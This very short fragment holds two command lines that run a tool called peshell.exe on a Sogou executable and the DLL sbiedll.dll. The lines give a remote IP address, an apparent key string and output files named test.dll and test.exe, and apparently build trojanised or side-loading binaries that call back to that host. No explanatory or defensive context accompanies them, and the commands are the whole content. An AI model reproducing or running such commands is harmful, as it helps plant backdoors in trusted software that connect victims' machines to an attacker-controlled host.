...
peshell.exe -bd sogou.exe sbiedll.dll -p 47.116.51.29 jypc20201217 -o test.dll
peshell.exe -be sogou.exe sbiedll.dll -p 47.116.51.29 jypc20201217 -o test.exe
